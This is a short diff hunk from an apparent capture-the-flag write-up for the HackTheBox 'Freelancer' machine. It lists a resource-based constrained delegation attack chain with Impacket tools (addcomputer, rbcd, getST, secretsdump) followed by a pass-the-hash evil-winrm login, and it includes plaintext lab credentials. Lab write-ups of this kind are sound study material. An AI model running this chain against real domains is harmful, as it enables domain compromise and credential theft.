@@ -165,4 +165,5 @@ addcomputer.py -method SAMR -computer-name 'dracula' -computer-pass 'Dr@cul@123!
 rbcd.py -delegate-from 'dracula$' -delegate-to 'dc$' -action 'write' 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'
 getST.py -spn 'cifs/DC.freelancer.htb' -impersonate 'administrator' 'freelancer.htb/dracula$:Dr@cul@123!'
 KRB5CCNAME='administrator@cifs_DC.freelancer.htb@FREELANCER.HTB.ccache' secretsdump.py -no-pass -k dc.freelancer.htb -just-dc-ntlm
-evil-winrm -i freelancer.htb -u administrator -H 
+==========(23)======================================================================================================================
+evil-winrm -i freelancer.htb -u administrator -H <hash>
